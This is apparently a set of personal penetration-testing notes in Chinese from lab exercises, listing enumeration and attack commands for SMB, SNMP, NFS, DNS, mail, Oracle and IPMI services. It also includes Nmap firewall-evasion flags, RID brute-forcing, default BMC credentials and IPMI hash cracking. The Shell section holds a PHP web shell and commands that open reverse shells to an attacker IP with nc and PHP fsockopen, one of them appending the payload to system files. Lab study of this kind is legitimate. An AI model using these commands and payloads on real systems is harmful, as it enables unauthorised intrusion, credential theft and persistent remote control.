# SMB

```
nmap --script smb-os-discovery.nse -p445 10.129.181.147


smbclient -N -L \\\\10.129.42.253
smbclient \\\\10.129.181.147\\users #以guest身份登录
smbclient -U bob \\\\10.129.42.253\\users #使用bob用户登录 ls cd get都可用
!ls #smb上执行
smbstatus # 系统上执行


rpcclient -U "" 10.129.14.128
srvinfo
enumdomains
querydominfo
netshareenumall
netsharegetinfo notes
enumdomusers
queryuser 0x3e9
querygroup 0x201
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done #暴力破解rid
samrdump.py 10.129.14.128
smbmap -H 10.129.14.128
crackmapexec smb 10.129.14.128 --shares -u '' -p ''


git clone https://github.com/cddmp/enum4linux-ng.git
./enum4linux-ng.py 10.129.14.128 -A
```

# SNMP

在 SNMP 版本 1 和 2c 中，使用纯文本社区字符串控制访问，如果我们知道名称，就可以访问它。加密和身份验证仅在 SNMP 版本 3 中添加。

```
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
snmpwalk -v 2c -c private  10.129.42.253 #查询名称找Nday
onesixtyone -c dict.txt 10.129.42.254
```

# Shell

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.113 9443 >/tmp/f"); ?>
    
```

```shell-session
gobuster dir -u http://10.129.73.163/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
curl http://10.129.91.93/nibbleblog/README
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.113 8443 >/tmp/f' | tee -a monitor.sh /usr/bin/php
python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo php -r '$sock=fsockopen("10.10.14.113",8443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

# Nmap

```
sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping #可以根据TTL推断系统
xsltproc target.xml -o target.html #比较直观好看
nc -nv 10.129.2.28 25#会显示系统类型
nmap 10.129.2.28 -p 80 -sV --script vuln #漏洞检测
sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 #使用诱饵
sS SYN;sA ACK;sT Connect，sS容易被过滤，sA不容易被过滤

#####规避防火墙
sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
nmap -sU -p 53 --script dns-nsid,banner -Pn -n -disable-arp-ping -sV 10.129.2.48
1)nmap x.x.x.x -sS -Pn -n --source-port 53
2)nmap x.x.x.x -sT -Pn -n --source-port 53 -D RND:5
nmap x.x.x.x -sT -pn -n --source-port 53 -D RND:5 -p 53 -sV
3)nmap x.x.x.x -sS -Pn -n --source-port 53 -D RND:5
nmap x.x.x.x -sT -pn -n --source-port 5000 -D RND:5 -p 53 -sV
ncat -nv --source-port 53 10.129.102.234 5000
nmap -sS -A -T2 --data-length 1400 #分片绕过防火墙
```

```
其他扫描软件
rustscan -b 500 -t 4000 -a x.x.x.x --range 1-65535
fscan -h x.x.x.x -p 1-65535
scaninfo -i x.x.x.x -p 1-65535
```

# 子域名收集

```
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .#以json格式输出

curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u#按唯一子域对它们进行筛选
```

# exploits

```
find / -type f -name ftp* 2>/dev/null | grep scripts #nmap
```

以下服务的利用可以用于查找服务的配置，找到弱配置。

# FTP

```
cat /etc/ftpusers
```

 TFTP 与 FTP 不同，它不需要用户的身份验证。它不支持通过密码进行受保护的登录，并且仅根据作系统中文件的读写权限设置访问限制。与 FTP 客户端不同，`TFTP` 没有目录列表功能。

# NFS

```
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
showmount -e 10.129.14.128

mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS
tree .

ls -l mnt/nfs/
ls -n mnt/nfs/

sudo umount ./target-NFS
```

# DNS

```
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done#子域暴力破解
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

# SMTP

```
smtp-user-enum -M VRFY -U /usr/share/seclists/Discovery/SNMP/snmp.txt -t 10.129.145.179 -w 15
```

# IMAP/POP3

110和995(加密)用于pop3

143和993(加密)用于imap

```
nmap 10.129.134.32 -sV -p110,143,993,995 -sC
curl -k 'imaps://10.129.134.32' --user robin：robin
curl -k 'imaps://10.129.134.32' --user robin：robin -v
openssl s_client -connect 10.129.134.32:pop3s
openssl s_client -connect 10.129.134.32:imaps
robin：robin
```

imap支持用户列举，但pop3不支持。

# SNMP

161端口发送控制指令

SNMPv1 `没有内置的身份验证`机制，SNMPv2 存在于不同的版本中。今天仍然存在的版本是 `v2c`，扩展名 `c` 表示基于社区的 SNMP。

```
snmpwalk -v2c -c public 10.129.14.128
```

# Oracle

1521端口

```
nmap -p1521 -sV 10.129.180.180 --open --script oracle-sid-brute

###############安装odat和sqlplus
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome

```

# IPMI

IPMI 通过端口 623 UDP 进行通信。

```
nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local


use auxiliary/scanner/ipmi/ipmi_version 
set rhosts 10.129.42.195
run
```

Dell iDRAC :root :calvin

HP iLO: Administrator: 由数字和大写字母组成的随机 8 个字符的字符串

```
该命令 hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u 会尝试所有大写字母和数字的组合来获得 8 个字符的密码。
```

```
use auxiliary/scanner/ipmi/ipmi_dumphashes 
set rhosts 10.129.179.34
run
hashcat -m 7300 -a 0 -o found.txt hash.txt  /usr/share/wordlists/rockyou.txt

```

